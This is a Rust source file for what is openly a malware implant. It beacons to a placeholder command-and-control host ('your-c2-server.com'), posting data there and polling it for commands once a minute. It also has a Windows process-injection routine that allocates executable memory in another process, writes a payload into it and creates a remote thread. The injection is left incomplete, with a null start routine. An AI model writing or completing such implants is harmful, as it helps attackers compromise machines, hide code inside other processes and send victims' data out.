use std::time::Duration;
use std::sync::Arc;
use reqwest::Client;
use tokio::time::sleep;
use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
use winapi::um::winnt::{PROCESS_ALL_ACCESS, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::handleapi::CloseHandle;
use lazy_static::lazy_static;
use std::ffi::c_void;
use serde_json::json;

lazy_static! {
    static ref CLIENT: Arc<Client> = Arc::new(Client::new());
}

// Send data to the C2 server asynchronously
async fn send_data_to_c2(agent_id: &str, data: &str) -> Result<(), reqwest::Error> {
    let url = format!("https://your-c2-server.com/api/data/{}", agent_id);
    let client = Arc::clone(&CLIENT);
    
    let response = client
        .post(&url)
        .json(&json!({"data": data})) // Sending data as JSON for better structure
        .send()
        .await?;
    
    response.error_for_status()?; // Propagates error if the request fails
    Ok(())
}

// Fetch command from the C2 server asynchronously
async fn fetch_command(agent_id: &str) -> Result<String, reqwest::Error> {
    let url = format!("https://your-c2-server.com/api/command/{}", agent_id);
    let client = Arc::clone(&CLIENT);

    let response = client.get(&url).send().await?;
    response.error_for_status_ref()?; // Propagates error if the request fails

    let command: serde_json::Value = response.json().await?;
    Ok(command["action"].as_str().unwrap_or("sleep").to_string()) // Default to "sleep"
}

// Process injection into an existing process
fn inject_into_existing_process(pid: u32, payload: &[u8]) -> Result<(), String> {
    unsafe {
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if h_process.is_null() {
            return Err("Failed to open process".to_string());
        }

        let mem = VirtualAllocEx(
            h_process,
            std::ptr::null_mut(),
            payload.len(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );
        if mem.is_null() {
            CloseHandle(h_process);
            return Err("Failed to allocate memory in target process".to_string());
        }

        let mut written = 0;
        if WriteProcessMemory(h_process, mem, payload.as_ptr() as *const _, payload.len(), &mut written) == 0 {
            CloseHandle(h_process);
            return Err("Failed to write to process memory".to_string());
        }

        let mut thread_id: u32 = 0;
        if CreateRemoteThread(
            h_process,
            std::ptr::null_mut(),
            0,
            None, // Replace with actual entry point if needed
            mem,
            0,
            &mut thread_id,
        ).is_null()
        {
            CloseHandle(h_process);
            return Err("Failed to create remote thread".to_string());
        }

        CloseHandle(h_process);
        Ok(())
    }
}

// Main function to orchestrate the agent
#[tokio::main]
async fn main() {
    let agent_id = "agent_1234"; // Unique ID for your agent, change this as needed

    loop {
        // Try to send data to the C2 server
        if let Err(e) = send_data_to_c2(agent_id, "Sample data").await {
            eprintln!("Error sending data to C2: {}", e);
        }

        // Try to fetch a command from the C2 server
        match fetch_command(agent_id).await {
            Ok(command) => {
                if command == "exit" {
                    println!("Received exit command. Terminating.");
                    std::process::exit(0);
                } else {
                    println!("Received command: {}", command);
                }
            }
            Err(e) => eprintln!("Failed to fetch command: {}", e),
        }

        // Sleep to avoid overwhelming the network
        sleep(Duration::from_secs(60)).await;
    }
}

